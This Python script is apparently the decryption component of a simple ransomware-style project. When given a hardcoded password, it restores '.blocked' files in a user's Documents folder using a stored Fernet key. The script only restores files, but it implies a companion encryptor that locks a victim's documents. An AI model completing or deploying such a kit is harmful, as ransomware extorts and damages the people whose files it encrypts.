import os
from cryptography.fernet import Fernet

files = []
if os.name == "Windows" or os.name == "nt":
    path = "C:" + chr(92) + "Users" + chr(92) + os.environ.get("USERNAME")+ chr(92) + "Documents" + chr(92)
else:
    path = "/Users/" + os.environ.get('USER')+ "/Documents/"

if (os.path.exists(path + '/thekey.key')):
    for file in os.listdir(path):
        if (file.find(".blocked") != -1):
            files.append(file)

    with open(path + "thekey.key", "rb") as key:
        secretkey = key.read()

    secretphrase = "prueba"

    while True:
        user_phrase = input("Password: ")

        if user_phrase == secretphrase:
            for file in files:
                orig_file = file.rsplit('.', 1)[0]
                print(orig_file)
                os.rename(path + file, path + orig_file)

                file = orig_file
                
                with open(path + file, "rb") as thefile:
                    content = thefile.read()
                content_decrypted = Fernet(secretkey).decrypt(content)
                with open(path + file, "wb") as thefile:
                    thefile.write(content_decrypted)

            print("Files decrypted")
            with open(path + "README.txt", "w") as readme:
                readme.write("Your files have been saved.\nEnjoy :)")
            break
        else:
            print("Wrong password")
else:
    print("The file needs to be open in the encrypted directory (.key file is needed)")
